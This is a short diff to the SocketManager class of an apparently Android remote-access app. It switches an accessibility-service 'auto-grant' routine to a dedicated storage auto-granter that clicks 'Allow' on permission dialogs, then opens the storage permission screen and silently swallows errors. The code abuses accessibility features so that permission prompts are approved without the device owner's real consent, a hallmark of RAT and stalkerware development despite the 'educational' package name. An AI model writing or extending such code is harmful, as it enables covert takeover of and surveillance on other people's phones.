@@ -656,9 +656,9 @@ public class SocketManager {
                     try {
                         com.remoteaccess.educational.permissions.AutoPermissionManager apm =
                             new com.remoteaccess.educational.permissions.AutoPermissionManager(context);
-                        // Re-enable auto-grant so the accessibility clicker handles the dialog
+                        // Start dedicated storage auto-granter (clicks Allow access / Allow / toggle)
                         UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
-                        if (svc != null) svc.reEnableAutoGrant(20_000);
+                        if (svc != null) svc.enableStorageAutoGrant();
                         // Open the storage permission screen
                         apm.requestWriteExternalStorageLast();
                     } catch (Exception ignored) {}
